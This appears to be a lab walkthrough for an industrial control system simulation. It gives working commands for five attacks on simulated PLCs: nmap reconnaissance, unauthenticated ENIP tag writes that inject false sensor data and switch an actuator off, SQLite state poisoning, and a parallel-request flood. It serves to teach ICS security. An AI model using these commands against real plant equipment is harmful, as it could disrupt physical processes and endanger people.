# Toy Example — Attack Scenarios

This document walks through 5 attack scenarios against the toy example simulation.
Each attack maps directly to a real ICS/SCADA threat. Run them in order after the
simulation is already running (`sudo python run.py`).

## Prerequisites

The simulation must be running with PLCs active. If you followed the setup guide,
`run.py` should have been modified to uncomment the PLC start lines:

```python
plc1, plc2 = self.net.get('plc1', 'plc2')
plc2.cmd(sys.executable + ' plc2.py &> logs/plc2.log &')
plc1.cmd(sys.executable + ' plc1.py &> logs/plc1.log &')
```

Open a second terminal and tail the logs to observe effects in real time:

```bash
tail -f /vagrant/examples/toy/logs/plc1.log
tail -f /vagrant/examples/toy/logs/plc2.log
```

---

## Normal Operation (baseline)

Before attacking, understand what healthy looks like. Every second:

```
┌─────────────────────────────────────────────────────┐
│                   NORMAL OPERATION                   │
│                                                      │
│  plc2 (10.0.0.2)              plc1 (10.0.0.1)       │
│  ──────────────                ──────────────        │
│                                                      │
│  count = 0,1,2,3...                                  │
│       │                                              │
│       ├─ self.set(SENSOR3_2, count)                  │
│       │       └──→ SQLite: SENSOR3/pid=2 = count     │
│       │                        ↑                     │
│       │               self.get(SENSOR3_2)            │
│       │                   plc1 reads same value      │
│       │                                              │
│       └─ self.send(SENSOR3_1, count, 10.0.0.1) ──→  │
│                 TCP :44818 (ENIP)      │              │
│                                 self.receive()       │
│                                 plc1 reads same      │
│                                 value again          │
└─────────────────────────────────────────────────────┘

plc1 log output (every second):
  DEBUG: toy plc1 get SENSOR3_2:  0
  DEBUG: toy plc1 get SENSOR3_2:  1
  DEBUG: toy plc1 get SENSOR3_2:  2
  DEBUG: toy plc1 get SENSOR3_2:  3    ← both sources agree
```

Both the ENIP network path and the SQLite path return the same counter.
Any divergence between them after an attack is your indicator of compromise.

---

## Attack 1: Reconnaissance

**Real-world equivalent**: attacker plugs into the OT switch and maps the plant.

```
┌─────────────────────────────────────────────────────┐
│                    RECONNAISSANCE                    │
│                                                      │
│  attacker (plc2 shell)        plc1 (10.0.0.1)       │
│  ──────────────                ──────────────        │
│                                                      │
│  nmap scan ──────────────────→ port 44818 open?      │
│                                YES, no auth banner   │
│                                                      │
│  cpppo read ─────────────────→ give me all tags      │
│             ←─────────────────  SENSOR1=0            │
│                                 SENSOR2=0.0          │
│                                 SENSOR3=7   (live!)  │
│                                 ACTUATOR1=1 (ON)     │
│                                 ACTUATOR2=0 (OFF)    │
└─────────────────────────────────────────────────────┘
```

**Commands** (from Mininet CLI):

```bash
# Discover whether ENIP is running
mininet> plc2 nmap -sV -p 44818 10.0.0.1

# Read every tag — no credentials required
mininet> plc2 python -m cpppo.server.enip.client \
    --address 10.0.0.1:44818 \
    --print \
    'SENSOR1:1' 'SENSOR2:1' 'SENSOR3:1' 'ACTUATOR1:1' 'ACTUATOR2:1'
```

**Expected output**:

```
SENSOR1              =       [0]
SENSOR2              =       [0.0]
SENSOR3              =       [12]     ← live counter value
ACTUATOR1            =       [1]      ← 1 means ON
ACTUATOR2            =       [0]      ← 0 means OFF
```

**What went wrong**: full process state exposed with no login, no token, no audit
log entry. In a real plant this reveals every sensor reading and actuator position,
telling an attacker exactly what phase the process is in before launching a
targeted attack.

---

## Attack 2: False Data Injection

**Real-world equivalent**: intercepting or faking sensor data to cause a PLC to
make wrong control decisions (e.g. Stuxnet-style spoofed centrifuge readings).

```
┌─────────────────────────────────────────────────────┐
│                FALSE DATA INJECTION                  │
│                                                      │
│  plc2 (legitimate)     attacker      plc1           │
│  ──────────────        ────────      ────           │
│                                                      │
│  sends count=15 ──────────────────→ SENSOR3:1 = 15  │
│                                                      │
│  attacker writes fake separately:                    │
│  sends fake=999 ──────────────────→ SENSOR3:1 = 999 │
│                                                ↓     │
│                             self.receive() returns   │
│                             999 instead of 15        │
│                                                      │
│  SQLite still has real value=15   ← discrepancy!    │
└─────────────────────────────────────────────────────┘
```

**Commands**:

```bash
# Inject a frozen fake value into plc1's ENIP SENSOR3 tag
mininet> plc2 python -m cpppo.server.enip.client \
    --address 10.0.0.1:44818 \
    'SENSOR3:1=999'

# Immediately check SQLite to see the discrepancy
mininet> plc2 sqlite3 /vagrant/examples/toy/toy_db.sqlite \
    "SELECT name, pid, value FROM toy_table WHERE name='SENSOR3';"
```

**What you see — the divergence**:

```
SQLite  → SENSOR3 pid=2 = 17    (real, plc2 keeps incrementing)
ENIP    → SENSOR3:1    = 999    (your injected fake)
```

**plc1 log before vs after injection**:

```
DEBUG: toy plc1 get SENSOR3_2:  14    ← SQLite path (real)
DEBUG: toy plc1 get SENSOR3_2:  15    ← SQLite path (real)
```

Note: plc1 logs `get(SENSOR3_2)` which reads SQLite, not `receive()`. To observe
the injection fully, add a print for `rec_s31` in [plc1.py](plc1.py) line 44 and
restart — you will see `receive()` return 999 while `get()` returns the real counter.

**What went wrong**: the two truth sources disagree. In a real plant where the PLC
acts on the received value (e.g. open valve if sensor > threshold), a spoofed
reading above the threshold triggers a physical action that should not happen.

---

## Attack 3: Actuator Manipulation

**Real-world equivalent**: directly commanding an actuator (pump, valve, circuit
breaker) to change state without going through the control system.

```
┌─────────────────────────────────────────────────────┐
│               ACTUATOR MANIPULATION                  │
│                                                      │
│  BEFORE ATTACK                                       │
│  ACTUATOR1 = 1  (ON)   ← correct operational state  │
│                                                      │
│  attacker writes ACTUATOR1=0 to plc1's ENIP server  │
│       │                                              │
│       └──→ TCP to 10.0.0.1:44818                     │
│               ENIP server stores ACTUATOR1 = 0       │
│                                                      │
│  AFTER ATTACK                                        │
│  ENIP server:  ACTUATOR1 = 0  (OFF) ← attacker set  │
│  SQLite:       ACTUATOR1 = 1  (ON)  ← unchanged     │
│                                                      │
│  Plant and control system have different views       │
│  of reality — neither knows the other is wrong       │
└─────────────────────────────────────────────────────┘
```

**Commands**:

```bash
# Verify current state (should be 1 = ON)
mininet> plc2 python -m cpppo.server.enip.client \
    --address 10.0.0.1:44818 --print 'ACTUATOR1:1'
# ACTUATOR1   = [1]

# Flip it OFF
mininet> plc2 python -m cpppo.server.enip.client \
    --address 10.0.0.1:44818 \
    'ACTUATOR1:1=0'

# Confirm the write landed
mininet> plc2 python -m cpppo.server.enip.client \
    --address 10.0.0.1:44818 --print 'ACTUATOR1:1'
# ACTUATOR1   = [0]   ← flipped

# Check SQLite — it still shows 1
mininet> plc2 sqlite3 /vagrant/examples/toy/toy_db.sqlite \
    "SELECT name, pid, value FROM toy_table WHERE name='ACTUATOR1';"
# ACTUATOR1|int|1|1   ← SQLite still says ON
```

**The gap you just created**:

```
ENIP server (what the network sees) → ACTUATOR1 = 0  OFF
SQLite DB   (what the process sees) → ACTUATOR1 = 1  ON
```

**What went wrong**: in the toy this has no physical consequence because plc1's
`main_loop` does not read ACTUATOR1 back. In `swat-s1` the equivalent command
targets pump `P101` — the pump stops, the tank level drops until the low-low
alarm trips. Same command, real physical consequence.

---

## Attack 4: State DB Poisoning

**Real-world equivalent**: tampering with historian records or the shared state
store — a persistent, low-visibility attack that corrupts the ground truth.

```
┌─────────────────────────────────────────────────────┐
│                  STATE DB POISONING                  │
│                                                      │
│  plc2 writes counter every second to SQLite         │
│                                                      │
│  BETWEEN writes, attacker modifies SQLite directly  │
│       ↓                                              │
│  plc1 reads from SQLite → gets corrupted value      │
│  plc2 overwrites next second → recovers             │
│                                                      │
│  Timeline for SENSOR3 (plc2 keeps overwriting):     │
│  t=10s:   plc2 writes  SENSOR3/pid=2 = 10           │
│  t=10.1s: attacker writes SENSOR3/pid=2 = -999      │
│  t=10.2s: plc1 reads → gets -999  ← wrong!          │
│  t=11s:   plc2 overwrites → SENSOR3/pid=2 = 11      │
│                                                      │
│  For ACTUATOR1 (nothing ever overwrites it):         │
│  attacker writes ACTUATOR1 = 0 → stays 0 forever    │
└─────────────────────────────────────────────────────┘
```

**Commands**:

```bash
# Inject a bad value into SENSOR3 (will be overwritten by plc2 next second)
mininet> plc2 sqlite3 /vagrant/examples/toy/toy_db.sqlite \
    "UPDATE toy_table SET value='-999' WHERE name='SENSOR3' AND pid=2;"

# Watch plc1's log for the momentary corruption:
# DEBUG: toy plc1 get SENSOR3_2:  18
# DEBUG: toy plc1 get SENSOR3_2:  -999    ← injected
# DEBUG: toy plc1 get SENSOR3_2:  20      ← plc2 recovered it

# Persistent attack — poison a tag nothing ever writes back
mininet> plc2 sqlite3 /vagrant/examples/toy/toy_db.sqlite \
    "UPDATE toy_table SET value='0' WHERE name='ACTUATOR1' AND pid=1;"

# Verify it stays poisoned (plc2 never writes ACTUATOR1)
mininet> plc2 sqlite3 /vagrant/examples/toy/toy_db.sqlite \
    "SELECT * FROM toy_table;"
```

**What you see in plc1's log**:

```
DEBUG: toy plc1 get SENSOR3_2:  17
DEBUG: toy plc1 get SENSOR3_2:  18
DEBUG: toy plc1 get SENSOR3_2:  -999    ← injected
DEBUG: toy plc1 get SENSOR3_2:  20      ← plc2 recovered it
```

**What went wrong**: `SENSOR3` recovered because plc2 overwrites it every second.
`ACTUATOR1` stays poisoned permanently because nothing recalculates it. In a real
historian this is the equivalent of inserting false process records — the
corrupted data stays until someone manually audits the DB and notices the anomaly.

---

## Attack 5: Denial of Service

**Real-world equivalent**: overwhelming a PLC's communication stack so legitimate
commands are delayed or dropped, causing the control loop to run on stale data.

```
┌─────────────────────────────────────────────────────┐
│                   DENIAL OF SERVICE                  │
│                                                      │
│  plc2 (legitimate)     attacker      plc1           │
│  ──────────────        ────────      ────           │
│                                                      │
│  send(SENSOR3) ──→                                   │
│                   flood ──→──→──→──→ ENIP port 44818 │
│                   flood ──→──→──→──→ queue fills up  │
│                   flood ──→──→──→──→                 │
│  send(SENSOR3) ──→  DROPPED  ↑ can't get through     │
│                                                      │
│  plc1's receive() starts blocking — control loop     │
│  slows down and misses updates                       │
└─────────────────────────────────────────────────────┘
```

**Commands**:

```bash
# Baseline — time a single tag read
mininet> plc2 time python -m cpppo.server.enip.client \
    --address 10.0.0.1:44818 --print 'SENSOR3:1'

# Launch 200 parallel ENIP reads to saturate the server
mininet> plc2 bash -c \
    'for i in $(seq 1 200); do \
        python -m cpppo.server.enip.client \
            --address 10.0.0.1:44818 --print "SENSOR3:1" & \
     done; wait'

# Watch plc1's log while flooding — look for gaps between entries
tail -f /vagrant/examples/toy/logs/plc1.log
```

**What you see in plc1's log during the flood**:

```
DEBUG: toy plc1 get SENSOR3_2:  45
DEBUG: toy plc1 get SENSOR3_2:  46
                                        ← gap: receive() blocked
                                        ← gap: waiting on ENIP server
DEBUG: toy plc1 get SENSOR3_2:  49     ← 3 counts skipped
```

**What went wrong**: plc1's `main_loop` calls `self.receive()` which blocks until
the ENIP subprocess returns. When the server is flooded, that call takes longer —
the control loop runs slower and misses sensor updates. In a real plant a PLC
that cannot read its sensors at the required scan rate will make control decisions
on stale data, potentially missing a threshold crossing.

---

## Summary

```
┌──────────────────┬─────────────────┬──────────────────────────────┐
│ Attack           │ What it breaks  │ Real-world consequence        │
├──────────────────┼─────────────────┼──────────────────────────────┤
│ 1. Recon         │ Confidentiality │ Attacker maps your plant      │
│ 2. Data inject   │ Integrity       │ PLC acts on false sensor data │
│ 3. Actuator flip │ Availability    │ Pump stops, valve closes      │
│ 4. DB poison     │ Integrity       │ Persistent false history      │
│ 5. DoS flood     │ Availability    │ Control loop runs on stale    │
└──────────────────┴─────────────────┴──────────────────────────────┘
```

All five attacks require zero credentials and work from any host on the same
L2 segment — which is typical of legacy flat OT networks.

The next step is `examples/swat-s1`, where the physical process simulation
(tank level dynamics) makes these attacks produce real measurable consequences
in sensor readings and actuator states.
